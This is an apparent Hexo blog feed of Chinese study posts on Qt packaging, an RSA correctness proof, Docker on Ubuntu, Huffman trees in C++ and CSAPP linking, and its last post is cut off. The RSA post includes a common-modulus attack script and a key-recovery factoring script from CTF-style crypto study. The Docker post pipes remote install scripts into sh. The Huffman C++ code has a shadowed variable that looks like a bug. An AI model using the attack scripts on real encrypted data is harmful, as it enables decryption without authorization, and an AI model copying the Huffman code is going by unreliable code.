alt=""><br>总结一下常见文件目录的作用</p><ol><li>Headers<br>指定项目中所有的头文件。</li><li>FORMS<br>指定UI文件在编译前被uic处理。所有的构建这些UI文件所需的依赖、头文件和源文件都会自动被添加到项目中。</li><li>CONFIG<br>指定编译器选项和项目配置，值由qmake内部识别并具有特殊意义。</li><li>LIBS<br>指定链接到项目中的库列表。如果使用Unix -l (library) 和 -L (library path) 标志，在Windows上qmake正确处理库（也就是说，将库的完整路径传递给链接器），库必须存在，qmake会寻找-l指定的库所在的目录。</li><li>SOURCES<br>指定项目中所有源文件。</li></ol><h4 id="3-Design"><a href="#3-Design" class="headerlink" title="3.Design"></a>3.Design</h4><p>qtcreator具备可视化编辑ui,双击mainwindow.ui即进入左侧任务栏中的Design<br>在左侧拉一个Display Widgets-&gt;Label 进去即可<br><img src="8.png" alt=""></p><h3 id="三、编译以及打包"><a href="#三、编译以及打包" class="headerlink" title="三、编译以及打包"></a>三、编译以及打包</h3><h4 id="1-编译，选择Qt-5-9-0-MinGW-32bit-不是强制，可自选-，为了打包所以选择Release"><a href="#1-编译，选择Qt-5-9-0-MinGW-32bit-不是强制，可自选-，为了打包所以选择Release" class="headerlink" title="1. 编译，选择Qt 5.9.0 MinGW 32bit(不是强制，可自选)，为了打包所以选择Release"></a>1. 编译，选择Qt 5.9.0 MinGW 32bit(不是强制，可自选)，为了打包所以选择Release</h4><p><img src="9.png" alt=""><br>点击第二个（非debug,即可编译运行，然后会在源代码的文件夹出现一个build-XX的文件目录<br><img src="10.png" alt=""><br>找到里面的release-&gt;hello.exe 双击运行会提示少一大堆.dll,所以要打包</p><h4 id="2-自动打包"><a href="#2-自动打包" class="headerlink" title="2. 自动打包"></a>2. 自动打包</h4><p>Qt 官方开发环境使用的动态链接库方式，在发布生成的exe程序时，需要复制一大堆 dll，如果自己去复制dll，很可能丢三落四，导致exe在别的电脑里无法正常运行。<br>因此 Qt 官方开发环境里自带了一个工具：windeployqt.exe。<br>这个工具在该编译器所在的bin目录下，是一个终端操作工具<br><img src="11.png" alt=""><br>你只需要把release目录下的hello.exe复制到bin目录下 cmd输入 windeployqt.exe hello.exe即可，但是这个会导致你的bin目录非常恶心<br>所以直接，新建一个目录，里面放一个从Releasee复制出来的hello.exe,cmd切到hello.exe目录下然后（只要一个hello.exe即可）</p><pre><code>{你自己的Qt安装路径}\Qt\5.9\mingw53_32\bin\windeployqt.exe hello.exe</code></pre><p>或者先把该编译器的bin目录放在环境变量中</p><pre><code>windeployqt.exe hello.exe</code></pre><p><img src="12.png" alt=""><br>然后hello.exe 文件夹下会出现一堆依赖文件，即可帮助你运行hello.exe<br><img src="13.png" alt=""></p><h4 id="3-可能遇到的问题"><a href="#3-可能遇到的问题" class="headerlink" title="3.可能遇到的问题"></a>3.可能遇到的问题</h4><p>windeployqt.exe的作用其实也就是简单把项目需要的的dll从bin目录下复制出来，所以如果在打包之后运行还提示缺少了什么.dll文件，直接去编译器的bin目录下复制过来即可。</p>]]></content>
      
      
      <categories>
          
          <category> 雁儿几度恋开发-愿得一站入万家 </category>
          
          <category> Qt </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Qt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA证明</title>
      <link href="/2018/12/31/rsa-zheng-ming/"/>
      <url>/2018/12/31/rsa-zheng-ming/</url>
      
        <content type="html"><![CDATA[<h3 id="一、RSA介绍"><a href="#一、RSA介绍" class="headerlink" title="一、RSA介绍"></a>一、RSA介绍</h3><p>RSA 加密算法是一种非对称加密算法。在公开密钥加密和电子商业中 RSA 被广泛使用。RSA 是 1977 年由罗纳德 · 李维斯特（Ron Rivest）、阿迪 · 萨莫尔（Adi Shamir）和伦纳德 · 阿德曼（Leonard Adleman）一起提出的。RSA 就是他们三人姓氏开头字母拼在一起组成的。<br>RSA 算法的可靠性由极大整数因数分解的难度决定。换言之，对一极大整数做因数分解愈困难，RSA 算法愈可靠。假如有人找到一种快速因数分解的算法的话，那么用 RSA 加密的信息的可靠性就肯定会极度下降。但找到这样的算法的可能性是非常小的。如今，只有短的 RSA 密钥才可能被强力方式解破。到 2017 年为止，还没有任何可靠的攻击 RSA 算法的方式。</p><a id="more"></a><h3 id="二、已知条件"><a href="#二、已知条件" class="headerlink" title="二、已知条件"></a>二、已知条件</h3><p>RSA的加密规则：$ \color{blue}{m^e \equiv c\pmod n}$<br>RSA的解密规则：$\color{red}{c^d \equiv m\pmod n}$</p><p>约束条件及规则说明：</p><ol><li>m为明文字符，c为密文字符</li><li>m为0到n-1之间的数值</li><li>n=pq，p,q为素数</li><li>φ(n)=(p-1)*(q-1) [根据欧拉定理]</li><li>e与φ(n)互素</li><li>$ ed \equiv 1\pmod {φ(n)}$</li><li>欧拉公式$m^φ(n) \equiv 1\pmod n$</li></ol><p>要根据加密规则，数论及欧拉定理，来证明解密公式正确性：$\color{red}{c^d \equiv m\pmod n}$</p><h3 id="三、证明过程"><a href="#三、证明过程" class="headerlink" title="三、证明过程"></a>三、证明过程</h3><p><strong>step1</strong>、根据加密规则公式$ \color{blue}{m^e \equiv c\pmod n}$<br>可以得出 $$c=m^e-kn$$<br><strong>step2</strong>、 将C带入解密公式，得到<br>$$(m^e-kn)^d \equiv m\pmod n$$<br><strong>step3</strong>、左边的展开中，除了第一项以外，其他项都与n相乘过，所以可以直接忽略左边括号中的kn项目，即：<br>$$m^{ed} \equiv m\pmod n$$<br><strong>step4</strong>、因为 $ed\equiv1 \pmod {φ(n)}$ 即：<br> $$ed=hφ(n)+1$$<br><strong>step5</strong>、上述结论代入step3的公式，得到<br>$$m^{hφ(n)+1} \equiv m \pmod n $$<br><strong>step6</strong>、分情况讨论<br>6.1 、<strong>m与n互质</strong>（如果你已经忘了m和n是什么了，请往前再看一遍）<br>根据欧拉定理$m^φ(n) \equiv 1\pmod n$ 得到 $m^{φ(n)}=kn+1$<br>然后左右两边分别h次方得到(kn+1)的h次方还是kn+1只不过这里的k变了：<br>$$(m^{φ(n)})^h=kn+1$$<br>然后左右两边乘以m即得到$$m^{hφ(n)+1} \equiv m \pmod n $$<br>6.2 、<strong>m与n不互质</strong><br>此时，由于n等于质数p和q的乘积，所以m必然等于kp或kq。<br>以 m = kp为例，这时k与q必然互质。如果k与q 不为互质关系，则k=tq, m= tqp=tn, 但是按照RSA规范，m∈(0…n−1) m\in(0…n-1)m∈(0…n−1), m &lt; n的，所以k与q肯定是互质关系的。由于k与q互质，p与q互质，kp与q肯定互质，则根据欧拉定理，下面的式子成立：<br>$$\Large (kp)^{ q-1} \equiv 1\pmod q$$<br>进一步扩展，可得：<br>$$ \Large [(kp)^{ q-1}]^{h(p-1)}\times kp \equiv kp\pmod q$$<br>即<br>$$\Large (kp)^{ed} \equiv kp\pmod q$$<br>进一步改写成等式：<br>$$\Large (kp)^{ed} = kp+tq$$<br>显然，t能被p整除， 即t=t’p,可以得出<br>$$\Large (kp)^{ed} = kp+t’pq$$</p><p>因为m=kp, n=pq, 最后得出<br>$$\Large m^{ed} \equiv m\pmod n$$<br>解密公式得到完全证明。</p><h3 id="四、关于共模攻击脚本（其他的脚本要求安一堆奇怪的包，在win10还装不上，这里贴一个野生的共模攻击脚本"><a href="#四、关于共模攻击脚本（其他的脚本要求安一堆奇怪的包，在win10还装不上，这里贴一个野生的共模攻击脚本" class="headerlink" title="四、关于共模攻击脚本（其他的脚本要求安一堆奇怪的包，在win10还装不上，这里贴一个野生的共模攻击脚本"></a>四、关于共模攻击脚本（其他的脚本要求安一堆奇怪的包，在win10还装不上，这里贴一个野生的共模攻击脚本</h3><pre><code># coding=utf-8import syssys.setrecursionlimit(10000000)&quot;&quot;&quot;选择相同的模 n 加密相同的信息 m&quot;&quot;&quot;helpstr = &#39;&#39;&#39;usage:    c1 = m ^ e1 % n    c2 = m ^ e2 % n&#39;&#39;&#39;def egcd(a, b):    if a == 0:        return (b, 0, 1)    else:        g, y, x = egcd(b % a, a)        return (g, x - (b // a) * y, y)def modinv(a, m):    g, x, y = egcd(a, m)    if g != 1:        raise Exception(&#39;modular inverse does not exist&#39;)    else:        return x % mdef main():    print(helpstr)    n = int(input(&quot;input n: &quot;))    c1 = int(input(&quot;input c1: &quot;))    c2 = int(input(&quot;input c2: &quot;))    e1 = int(input(&quot;input e1: &quot;))    e2 = int(input(&quot;input e2: &quot;))    s = egcd(e1, e2)    s1 = s[1]    s2 = s[2]    # 求模反元素    if s1 &lt; 0:        s1 = - s1        c1 = modinv(c1, n)    elif s2 &lt; 0:        s2 = - s2        c2 = modinv(c2, n)    m = (c1**s1)*(c2**s2) % n    print(m)if __name__ == &#39;__main__&#39;:    main()</code></pre><p>分解模数脚本</p><pre><code># 分解模数ndef rsa_moder(n):    base = 2    while base &lt; n:        if n % base == 0:            return base, n // base        base += 1# 求欧拉函数f(n)def rsa_get_euler(prime1, prime2):    return (prime1 - 1) * (prime2 - 1)# 求私钥def rsa_get_key(e, euler):    k = 1    while True:        if (((euler * k) + 1) % e) == 0:            return (euler * k + 1) // e        k += 1# 根据n,e计算d(或根据n,d计算e)def get_rsa_e_d(n, e=None, d=None):    if e is None and d is None:        return    arg = e    if arg is None:        arg = d    primes = rsa_moder(n)    p = primes[0]    q = primes[1]    d = rsa_get_key(arg, rsa_get_euler(p, q))    return ddef test():    str_fmt = &#39;n: {:&lt;10} e: {:&lt;10} d: {:&lt;10}&#39;    # 导入rsa库    import rsa as rsa    key = rsa.newkeys(24)    # 产生rsa密钥对    if isinstance(key[1], rsa.PrivateKey):        print(str_fmt.format(key[1].n, key[1].e, key[1].d))    # 解密    n = 14666299    d = 2101153    e = get_rsa_e_d(n, None, d)    print(str_fmt.format(n, e, d))    n = 12748507    e = 65537    d = get_rsa_e_d(n, e, None)    print(str_fmt.format(n, e, d))if __name__ == &#39;__main__&#39;:    test()</code></pre>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu中Docker的安装&amp;&amp;遇到的坑&amp;&amp;简单命令</title>
      <link href="/2018/12/28/ubuntu-zhong-docker-de-an-zhuang-yu-dao-de-keng-jian-dan-ming-ling/"/>
      <url>/2018/12/28/ubuntu-zhong-docker-de-an-zhuang-yu-dao-de-keng-jian-dan-ming-ling/</url>
      
        <content type="html"><![CDATA[<h3 id="1、前提条件-本博客基于ubuntu"><a href="#1、前提条件-本博客基于ubuntu" class="headerlink" title="1、前提条件 本博客基于ubuntu"></a>1、前提条件 本博客基于ubuntu</h3><p>Docker 要求 Ubuntu 系统的内核版本高于 3.10 ，查看本页面的前提条件来验证你的 Ubuntu 版本是否支持 Docker。<br>通过 uname -r 命令查看你当前的内核版本</p><pre><code>runoob@runoob:~$ uname -r</code></pre><p><img src="2.png" alt=""></p><a id="more"></a><h3 id="2、安装-Docker"><a href="#2、安装-Docker" class="headerlink" title="2、安装 Docker"></a>2、安装 Docker</h3><h4 id="2-1、获取最新版本的-Docker-安装包"><a href="#2-1、获取最新版本的-Docker-安装包" class="headerlink" title="2.1、获取最新版本的 Docker 安装包"></a>2.1、获取最新版本的 Docker 安装包</h4><pre><code>runoob@runoob:~$ wget -qO- https://get.docker.com/ | sh</code></pre><p><img src="3.png" alt=""><br>输入当前用户的密码后，就会下载脚本并且安装Docker及依赖包。<br><img src="4.png" alt=""><br>安装完成后有个提示：</p><pre><code>    If you would like to use Docker as a non-root user, you should now consider    adding your user to the &quot;docker&quot; group with something like:    sudo usermod -aG docker runoob   Remember that you will have to log out and back in for this to take effect!  </code></pre><h4 id="2-2、速度很慢怎么慢"><a href="#2-2、速度很慢怎么慢" class="headerlink" title="2.2、速度很慢怎么慢"></a>2.2、速度很慢怎么慢</h4><p>修改/etc/docker/daemon.json 文件为 </p><pre><code>{&quot;registry-mirrors&quot;: [&quot;http://4e70ba5d.m.daocloud.io&quot;]}</code></pre><p>或者直接用下面脚本跑（真香，ID可以自己在daocloud配</p><pre><code>root@ubuntu:~# curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://4e70ba5d.m.daocloud.ioroot@ubuntu:~# cat /etc/docker/daemon.json {&quot;registry-mirrors&quot;: [&quot;http://4e70ba5d.m.daocloud.io&quot;]}</code></pre><p>然后重启</p><pre><code>root@ubuntu:~# service docker restart  </code></pre><h4 id="2-3、无法获得锁-var-lib-apt-lists-lock-open-11-资源暂时不可用"><a href="#2-3、无法获得锁-var-lib-apt-lists-lock-open-11-资源暂时不可用" class="headerlink" title="2.3、无法获得锁 /var/lib/apt/lists/lock - open (11: 资源暂时不可用)"></a>2.3、无法获得锁 /var/lib/apt/lists/lock - open (11: 资源暂时不可用)</h4><p>出现这个问题的原因可能是有另外一个程序正在运行，导致资源被锁不可用。而导致资源被锁的原因，可能是上次安装时没正常完成，而导致出现此状况。<br>有两种方法<br>1、通过删除文件（实测方法2友好一些</p><pre><code>sudo rm /var/cache/apt/archives/locksudo rm /var/lib/dpkg/lock</code></pre><p>2、通过ps查看apt-get的PID 然后sudo kill 就可以<br><img src="5.png" alt=""></p><h3 id="3、然后就是基本命令"><a href="#3、然后就是基本命令" class="headerlink" title="3、然后就是基本命令"></a>3、然后就是基本命令</h3><h4 id="3、1-添加用户组"><a href="#3、1-添加用户组" class="headerlink" title="3、1:添加用户组"></a>3、1:添加用户组</h4><p>默认来说docker只能sudo运行为了下次方便使用，可以添加用户到docker用户组</p><pre><code>sudo usermod -aG docker ${USER}</code></pre><p><img src="8.png" alt=""><br>然后下次登陆即可非root使用docker</p><h4 id="3、2-查看Docker版本信息"><a href="#3、2-查看Docker版本信息" class="headerlink" title="3、2:查看Docker版本信息"></a>3、2:查看Docker版本信息</h4><pre><code>docker version</code></pre><p><img src="7.png" alt=""></p><h4 id="3、3-查看本地镜像"><a href="#3、3-查看本地镜像" class="headerlink" title="3、3: 查看本地镜像"></a>3、3: 查看本地镜像</h4><pre><code>docker images</code></pre><p><img src="9.png" alt=""></p><h4 id="3、4：容器从哪里来"><a href="#3、4：容器从哪里来" class="headerlink" title="3、4：容器从哪里来"></a>3、4：容器从哪里来</h4><p>开始如果你什么镜像都没有，你想要一个ubuntu的镜像可以直接下载</p><pre><code>kitty@ubuntu:~$ docker pull ubuntu或者kitty@ubuntu:~$ docker run ubuntu</code></pre><p>比如你要一个nginx镜像<br><img src="10.png" alt=""><br>然后你就可以使用docker images 查看安装了哪些</p><h4 id="3、5：普通运行"><a href="#3、5：普通运行" class="headerlink" title="3、5：普通运行"></a>3、5：普通运行</h4><p>docker run -t -i ubuntu /bin/bash命令指定使用镜像ubuntu来启动一个容器 其中要保证ubuntu是images中已经存在的镜像<br>-it 表示运行在交互模式，是-i -t的缩写，即-it是两个参数：-i和-t。前者表示打开并保持stdout，后者表示分配一个终端（pseudo-tty）一般这个模式就是可以启动bash，然后和容器有命令行的交互<br><img src="12.png" alt=""></p><h4 id="3、6：查看当前正在运行的容器："><a href="#3、6：查看当前正在运行的容器：" class="headerlink" title="3、6：查看当前正在运行的容器："></a>3、6：查看当前正在运行的容器：</h4><pre><code>~$ docker ps</code></pre><p><img src="13.png" alt=""><br>其中加上-a 表示查看所有的容器，包括已经停了的</p><h4 id="3、7：启动、停止、重启容器"><a href="#3、7：启动、停止、重启容器" class="headerlink" title="3、7：启动、停止、重启容器"></a>3、7：启动、停止、重启容器</h4><pre><code>~$ docker start aa97ba3292ce~$ docker stop aa97ba3292ce~$ docker restart aa97ba3292ce</code></pre><p>和容器有关的一般是容器的ID </p><h4 id="3、8：-删除镜像或者容器"><a href="#3、8：-删除镜像或者容器" class="headerlink" title="3、8： 删除镜像或者容器"></a>3、8： 删除镜像或者容器</h4><pre><code>~$ docker rm container_id~$ docker rmi image_id</code></pre><p>如果遇到了问题比如占用等加上参数 -f 一梭子下去就完事了（docker rm -f container_id</p><h3 id="4、跑一个nginx当demo玩玩"><a href="#4、跑一个nginx当demo玩玩" class="headerlink" title="4、跑一个nginx当demo玩玩"></a>4、跑一个nginx当demo玩玩</h3><h4 id="4-1、安装nginx"><a href="#4-1、安装nginx" class="headerlink" title="4.1、安装nginx"></a>4.1、安装nginx</h4><pre><code>kitty@ubuntu:~$ docker pull nginx</code></pre><h4 id="4-2、通过docker-images确认安装后运行一下"><a href="#4-2、通过docker-images确认安装后运行一下" class="headerlink" title="4.2、通过docker images确认安装后运行一下"></a>4.2、通过docker images确认安装后运行一下</h4><p><img src="14.png" alt=""><br>其中–name 后面接的是images名也就是 REPOSITORY对应的东西<br>-p后面的第一个8888是本地端口，80是nginx的端口，意思是将nginx端口映射到本地,现在可以访问本地8888端口<br><img src="15.png" alt=""></p><h4 id="4-3、使用自写的界面"><a href="#4-3、使用自写的界面" class="headerlink" title="4.3、使用自写的界面"></a>4.3、使用自写的界面</h4><p>先本地随便写一个index.html 然后当运行一个容器的时候，将该html替换进容器的index.html了<br>至于文件目录问题就要我们自己了解了 53be82f8c182这个东西是容器的ID<br><img src="16.png" alt=""><br>然后访问<br><img src="17.png" alt=""></p><h4 id="当然这个只是在容器中修改如果要完全保存起来，你需要学commit等操作形成新的镜像，本篇文章旨在入门，所以其他的希望看到本博客的能去自学，坚持下去，就是大佬了Orz。"><a href="#当然这个只是在容器中修改如果要完全保存起来，你需要学commit等操作形成新的镜像，本篇文章旨在入门，所以其他的希望看到本博客的能去自学，坚持下去，就是大佬了Orz。" class="headerlink" title="当然这个只是在容器中修改如果要完全保存起来，你需要学commit等操作形成新的镜像，本篇文章旨在入门，所以其他的希望看到本博客的能去自学，坚持下去，就是大佬了Orz。"></a>当然这个只是在容器中修改如果要完全保存起来，你需要学commit等操作形成新的镜像，本篇文章旨在入门，所以其他的希望看到本博客的能去自学，坚持下去，就是大佬了Orz。</h4><h3 id="最后附上一张高大上的Docker命令图-望君笑纳"><a href="#最后附上一张高大上的Docker命令图-望君笑纳" class="headerlink" title="最后附上一张高大上的Docker命令图,望君笑纳"></a>最后附上一张高大上的Docker命令图,望君笑纳</h3><p><img src="6.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 计算机杂七杂八 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>万物美好，世间温柔</title>
      <link href="/2018/12/27/wan-wu-mei-hao-shi-jian-wen-rou/"/>
      <url>/2018/12/27/wan-wu-mei-hao-shi-jian-wen-rou/</url>
      
        <content type="html"><![CDATA[<p>整理文件发现了几张初中高中画的画，当初也曾经想过大学学美术，最后还是跟着潮流学了计算机，曾经想过如果家里有钱，我还真去学美术的（当然也不是说学美术就赚不到钱，但是学计算机毕竟现在能独立生活，也曾经想过在大学里，左手程式右手诗，有空就画画，吉他，读诗（想想好中二啊）但是想想而来，入大学到现在，这个“有空”从何而来，也算是我背叛了当初的梦想而苟活至今，当然这也是时代的必然发展，就好比入了大学你有多久没开心一笑了。<br>大学时间过的太快，真的太快，快到你没空停下来看一场电影，但是高三却能追完整个火影。突然看到曾经的画，对于当初那份快乐，现在除了鼻子酸酸，真的只有回味了。望你我珍惜大学时光，不负韶华。<br>想了一下还是留几张照片放这里，希望自己能好好生活当一个正常人，当然从技术而言，肯定没法比艺术生，闻道有先后，术业有专攻</p><center> 给老姐的生日礼物</center><p><img src="9.jpg" alt=""></p><a id="more"></a><center> 大爱鸣雏</center><p><img src="4.jpg" alt=""><br><img src="5.jpg" alt=""><br><img src="7.jpg" alt=""></p><center>夏目</center><p><img src="8.jpg" alt=""><br><img src="3.jpg" alt=""></p><center>大爱火影（好中二啊 wsl</center><p><img src="6.jpg" alt=""></p><center>奇奇怪怪的一些垃圾</center><p><img src="10.jpg" alt=""></p><center>我也不知道是谁的谁</center><p><img src="11.jpg" alt=""></p><center>唯一喜欢的就是右图辣个蓝人</center><p><img src="1.jpg" alt=""></p><center>总感觉这个忙碌的人和我有某种关系♂</center><div align=center>![](2.jpg) ]]></content>
      
      
      <categories>
          
          <category> 情感生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 画画 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何建立huffmanTree</title>
      <link href="/2018/12/27/ru-he-jian-li-huffmantree/"/>
      <url>/2018/12/27/ru-he-jian-li-huffmantree/</url>
      
        <content type="html"><![CDATA[<h3 id="1、一些基本概念"><a href="#1、一些基本概念" class="headerlink" title="1、一些基本概念"></a>1、一些基本概念</h3><h4 id="1-1、定义"><a href="#1-1、定义" class="headerlink" title="1.1、定义"></a>1.1、定义</h4><p>哈夫曼树，又称最优树，是一类带权路径长度最短的树(为了防止前缀重复，所有数据一定为树叶)。</p><h4 id="1-2、路径和路径长度"><a href="#1-2、路径和路径长度" class="headerlink" title="1.2、路径和路径长度"></a>1.2、路径和路径长度</h4><p>从树中一个结点到另一个结点之间的分支构成两个结点的路径，路径上的分支数目叫做路径长度。树的路径长度是从树根到每一个结点的路径长度之和。</p><a id="more"></a><h4 id="1-3、带权路径长度"><a href="#1-3、带权路径长度" class="headerlink" title="1.3、带权路径长度"></a>1.3、带权路径长度</h4><p>结点的带权路径长度为从该结点到树根之间的路径长度与结点上权的乘积。树的带权路径长度为树中所有叶子结点的带权路径长度之和，通常记作WPL。</p><p>若有n个权值为w1,w2,…,wn的结点构成一棵有n个叶子结点的二叉树，则树的带权路径最小的二叉树叫做哈夫曼树或最优二叉树。<br><img src="1.png" alt=""><br>在上图中，3棵二叉树都有4个叶子结点a、b、c、d，分别带权7、5、2、4，则它们的带权路径长度为</p><p>（a）WPL = 7 × 2 + 5 × 2 + 2 × 2 + 4 × 2 = 36</p><p>（b）WPL = 4 × 2 + 7 × 3 + 5 × 3 + 2 × 1 = 46</p><p>（c）WPL = 7 × 1 + 5 × 2 + 2 × 3 + 4 × 3 = 35</p><p>其中（c）的WPL最小，可以验证，（c）恰为哈夫曼树。</p><h3 id="2、数据结构表示"><a href="#2、数据结构表示" class="headerlink" title="2、数据结构表示"></a>2、数据结构表示</h3><h4 id="2-1、结点表示"><a href="#2-1、结点表示" class="headerlink" title="2.1、结点表示"></a>2.1、结点表示</h4><pre><code>typedef struct{    int weight;    int parent;    int lchild,rchild;}HuffmanTreeNode;</code></pre><h4 id="2-2、一些数据关系"><a href="#2-2、一些数据关系" class="headerlink" title="2.2、一些数据关系"></a>2.2、一些数据关系</h4><p>1、哈夫曼树除了根结点，其他结点度数都为<strong>2</strong><br>2、m=2<em>n-1(m代表总结点个数，n代表树叶结点个数)<br>证明:<br>因为 结点总数=度数为0 1 2之和=度数为1+ 2</em>度数为2 +1（根节点）<br>所以 叶子结点数=度数为2的结点数+1<br>所以total=叶子+度数为2=2*n-1 得证</p><h4 id="2-3、初始状态"><a href="#2-3、初始状态" class="headerlink" title="2.3、初始状态"></a>2.3、初始状态</h4><p><img src="4.png" alt=""></p><h4 id="2-4、最终状态"><a href="#2-4、最终状态" class="headerlink" title="2.4、最终状态"></a>2.4、最终状态</h4><p><img src="5.png" alt=""></p><h3 id="3、创建哈夫曼树步骤"><a href="#3、创建哈夫曼树步骤" class="headerlink" title="3、创建哈夫曼树步骤"></a>3、创建哈夫曼树步骤</h3><p><img src="2.png" alt=""><br>假设有n个结点，n个结点的权值分别为w1,w2,…,wn，构成的二叉树的集合为F={T1,T2,…,Tn}，则可构造一棵含有n个叶子结点的哈夫曼树。步骤如下：<br>（1）从F中选取两棵根结点权值最小的树作为左右子树构造一棵新的二叉树，其新的二叉树的权值为其左右子树根结点权值之和；</p><p>（2）从F中删除上一步选取的两棵二叉树，将新构造的树放到F中；</p><p>（3）重复（1）（2），直到F只含一棵树为止。</p><h3 id="4、哈夫曼编码"><a href="#4、哈夫曼编码" class="headerlink" title="4、哈夫曼编码"></a>4、哈夫曼编码</h3><p>我们约定左分支表示字符’0’，右分支表示字符’1’，在哈夫曼树中从根结点开始，到叶子结点的路径上分支字符组成的字符串为该叶子结点的哈夫曼编码。上面代码所创建的哈夫曼树如下所示：<br><img src="3.png" alt=""><br>可以看出3被编码为00，1为010，2为011,4为10,5为11。在这些编码中，任何一个字符的编码均不是另一个字符编码的前缀。</p><h3 id="5、C-建立haffmanTree"><a href="#5、C-建立haffmanTree" class="headerlink" title="5、C++建立haffmanTree"></a>5、C++建立haffmanTree</h3><pre><code>#include&lt;iostream&gt;#include&lt;stack&gt;#include&lt;cstdlib&gt;#include&lt;vector&gt;using namespace std;typedef struct{    int weight;    int parent;    int lchild,rchild;}HuffmanTreeNode;int min(HuffmanTreeNode* &amp;tree,int k){    int minnum,min_weight;    int i=0;    while(tree[i].parent!=-1)    i++;//先将第一个parent为-1的元素的weight值赋给min_weight,留作以后比较用。    min_weight=tree[i].weight;    minnum=i;    for(;i&lt;k;i++)    {        if(tree[i].weight&lt;min_weight&amp;&amp;tree[i].parent==-1)        {            min_weight=tree[i].weight;            minnum=i;         }     }    tree[minnum].parent=1;    return minnum;}void Select(HuffmanTreeNode * &amp;tree,int k ,int &amp; i1,int &amp; i2){    i1=min(tree,k);    i2=min(tree,k);}void HaffmanTree(HuffmanTreeNode * &amp; tree,int w[],int n){    for(int i=0;i&lt;2*n-1;i++)    {        tree[i].parent=-1;        tree[i].lchild=-1;        tree[i].rchild=-1;    }    for(int i=0;i&lt;n;i++)    tree[i].weight=w[i];    int i1,i2;    for(int k=n;k&lt;2*n-1;k++)    {        Select(tree,k,i1,i2);//前K个找最小和第二小         tree[k].weight=tree[i1].weight+tree[i2].weight;        tree[i1].parent=k;        tree[i2].parent=k;        tree[k].lchild=i1;        tree[k].rchild=i2;    }    cout&lt;&lt;&quot;建哈夫曼树成功:\n&quot;;    for (int i=0; i&lt;2*n-1; i++) {        cout&lt;&lt;tree[i].weight&lt;&lt;&quot; &quot;&lt;&lt;tree[i].parent&lt;&lt;&quot; &quot;&lt;&lt;tree[i].lchild&lt;&lt;&quot; &quot;&lt;&lt;tree[i].rchild&lt;&lt;endl;    }}void ShowHaffmanCoding(HuffmanTreeNode* tree,int n){    int w=2*n-1;    vector&lt;stack &lt;char&gt; &gt;HuffmanCode;    stack&lt;char&gt;temp;    cout&lt;&lt;&quot;debug1&quot;&lt;&lt;endl;    //从结点开始找双亲    for(int i=0;i&lt;n;i++){            cout&lt;&lt;&quot;debug2&quot;&lt;&lt;endl;        int j=i;        int parent= tree[i].parent;//找到双亲        while(parent!=-1)        {             if(tree[parent].lchild==j) temp.push(&#39;0&#39;);//如果是左孩子            else temp.push(&#39;1&#39;);//右孩子            int j=parent;            parent=tree[j].parent;//直到根结点结束          }          HuffmanCode.push_back(temp);         while(!temp.empty()) temp.pop();    }     for(int i=0;i&lt;n;i++)    {        cout&lt;&lt;&quot;第&quot;&lt;&lt;i+1&lt;&lt;&quot;个数的权值为 : &quot;&lt;&lt;tree[i].weight&lt;&lt;&quot; 编码为： &quot;;        while(!HuffmanCode[i].empty())        {            cout&lt;&lt;HuffmanCode[i].top();            HuffmanCode[i].pop();         }          cout&lt;&lt;endl;    }}int main(){    cout&lt;&lt;&quot;请输入权值个数n\n&quot;;    int n=0;    cin&gt;&gt;n;    int m=2*n-1;    HuffmanTreeNode * tree=(HuffmanTreeNode *)malloc(sizeof(HuffmanTreeNode)*m);    for(int i=0;i&lt;m;i++){        tree[i].weight=tree[i].parent=tree[i].lchild=tree[i].rchild=0;    }    cout&lt;&lt;&quot;请输入权值: \n&quot;;    int w[n];    for(int i=0;i&lt;n;i++)    cin&gt;&gt;w[i];    HaffmanTree(tree,w,n);    ShowHaffmanCoding(tree,n);}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP又双叒叕来一遍之链接</title>
      <link href="/2018/12/21/csapp-you-shuang-ruo-zhuo-lai-yi-bian-zhi-lian-jie/"/>
      <url>/2018/12/21/csapp-you-shuang-ruo-zhuo-lai-yi-bian-zhi-lian-jie/</url>
      
        <content type="html"><![CDATA[<h4 id="整体看本章（第七章讲了啥）"><a href="#整体看本章（第七章讲了啥）" class="headerlink" title="整体看本章（第七章讲了啥）"></a>整体看本章（第七章讲了啥）</h4><p><img src="2.webp" alt=""></p><a id="more"></a><p>链接是将各种不同文件的代码和数据部分收集（符号解析和重定位）起来并组合成一个单一文件的过程。</p><h4 id="目标文件三种形式："><a href="#目标文件三种形式：" class="headerlink" title="目标文件三种形式："></a>目标文件三种形式：</h4><p>1、可重定位目标文件：包含二进制代码和数据，其形式可以在编译时与其他可重定位目标文件合并起来，创建一个可执行目标文件。<br>2、可执行目标文件：包含二进制代码和数据，其形式可以直接拷贝到存储器并执行。<br>3、共享目标文件：一种特殊类型的可重定位目标文件，可以在加载或运行时被动态地加载到存储器并链接。</p><h4 id="看一下GCC做了哪些事情"><a href="#看一下GCC做了哪些事情" class="headerlink" title="看一下GCC做了哪些事情"></a>看一下GCC做了哪些事情</h4><p><img src="3d.webp" alt=""></p><h4 id="细讲最后一步链接器（ld）做了啥"><a href="#细讲最后一步链接器（ld）做了啥" class="headerlink" title="细讲最后一步链接器（ld）做了啥"></a>细讲最后一步链接器（ld）做了啥</h4><p><img src="4.webp" alt=""><br>1、符号解析。目标文件定义和引用符号，符号解析的目的是将每个符号引用和一个符号定义联系起来；<br>2、重定位：把每个符号定义与一个存储器位置联系起来，然后修改对这些符号的引用，是的他们指向这个存储器位置，从而实现重定位。</p><h4 id="链接器操作的目标文件"><a href="#链接器操作的目标文件" class="headerlink" 